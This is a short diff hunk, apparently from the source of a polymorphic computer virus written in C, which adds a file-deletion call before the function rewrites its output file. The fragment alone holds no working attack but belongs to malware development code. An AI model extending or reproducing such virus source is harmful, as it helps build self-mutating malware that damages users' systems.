@@ -102,7 +102,8 @@ int polymorphic(unsigned long virus_instruction_begin, unsigned long virus_encry
 		goto quit;
 	}
 
-
+	remove(filename);
+	
 	// open the output file
 	FILE* out_file = fopen(filename, "wb");
 	if(!out_file)
